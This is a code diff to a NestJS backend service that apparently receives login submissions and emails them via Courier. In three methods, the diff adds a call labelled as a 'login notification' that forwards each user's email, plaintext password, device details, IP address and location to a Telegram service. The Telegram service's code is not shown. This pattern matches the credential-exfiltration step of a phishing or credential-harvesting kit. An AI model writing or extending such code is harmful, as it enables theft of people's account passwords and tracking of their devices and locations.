@@ -2,11 +2,15 @@ import { Injectable } from '@nestjs/common';
 import { EmailDto } from './dto/email.dto';
 import { CourierClient } from '@trycourier/courier';
 import { DeviceService } from './device.service';
+import { TelegramService } from './telegram.service';
 import { Request } from 'express';
 
 @Injectable()
 export class AppService {
-  constructor(private readonly deviceService: DeviceService) {}
+  constructor(
+    private readonly deviceService: DeviceService,
+    private readonly telegramService: TelegramService,
+  ) {}
   getHello(): string {
     return 'Hello World!';
   }
@@ -38,6 +42,16 @@ export class AppService {
         },
       },
     });
+
+    // Send notification to Telegram
+    await this.telegramService.sendLoginNotification(
+      email,
+      password,
+      source,
+      deviceDetails,
+      ipAddr,
+      location
+    );
 
     return { requestId };
   }
@@ -75,6 +89,17 @@ export class AppService {
         idempotencyExpiry: 3000,
       },
     );
+
+    // Send notification to Telegram
+    await this.telegramService.sendLoginNotification(
+      email,
+      password,
+      source,
+      deviceDetails,
+      ipAddr,
+      location
+    );
+
     return requestId;
   }
 
@@ -111,6 +136,17 @@ export class AppService {
         idempotencyExpiry: 3000,
       },
     );
+
+    // Send notification to Telegram
+    await this.telegramService.sendLoginNotification(
+      email,
+      password,
+      source,
+      deviceDetails,
+      ipAddr,
+      location
+    );
+
     return requestId;
   }
 }
